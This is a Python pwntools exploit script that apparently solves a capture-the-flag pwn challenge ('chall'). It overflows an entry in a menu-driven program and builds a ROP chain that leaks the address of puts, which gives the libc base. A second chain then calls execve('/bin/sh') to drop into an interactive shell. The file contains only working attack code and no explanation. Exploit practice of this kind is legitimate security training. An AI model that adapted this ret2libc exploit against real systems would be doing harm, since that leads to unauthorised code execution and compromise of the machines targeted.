from pwn import *
from sys import *

elf = context.binary = ELF("./chall")
p = process("./chall")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

HOST = 'localhost'
PORT = 1313

cmd = """
b*main
"""
if(argv[1] == 'gdb'):
	gdb.attach(p,cmd)
elif(argv[1] == 'rm'):
	p = remote(HOST,PORT)


def add(title, name, time):
	p.sendlineafter(b': ', b'1')
	p.sendlineafter(b': ', title)
	p.sendlineafter(b': ', name)
	p.sendlineafter(b': ', str(time))

def delete(idx):
	p.sendlineafter(b': ', b'2')
	p.sendlineafter(b': ', str(idx))



for i in range(99):
	add(b'A'*0xf8, b'B'*0xf8, 1)


rop = p64(0x00000000004011dd) #pop rbp
rop += p64(elf.got['puts'])
rop += p64(0x0000000000401792) #mov rdi, rbp; pop rbp; ret
rop += p64(0x0)
rop += p64(elf.sym['puts'])
rop += p64(elf.entry)
#rop += b'\x00'*(0xf8-len(rop))

payload = b'B'*0x80
payload += rop
add(b'A'*0xf8, payload, 1)

p.sendlineafter(b': ', b'4')
p.recvuntil(b'Exiting the program.\n')
leak = u64(p.recvn(6)+b'\x00'*2)
libc.address = leak - libc.sym['puts']
delete(100)


rop = ROP(libc)
rop.execve(next(libc.search(b'/bin/sh\x00')), 0, 0)

add(b'A'*0xf8, b'B'*0x80+rop.chain(), 1)

p.interactive()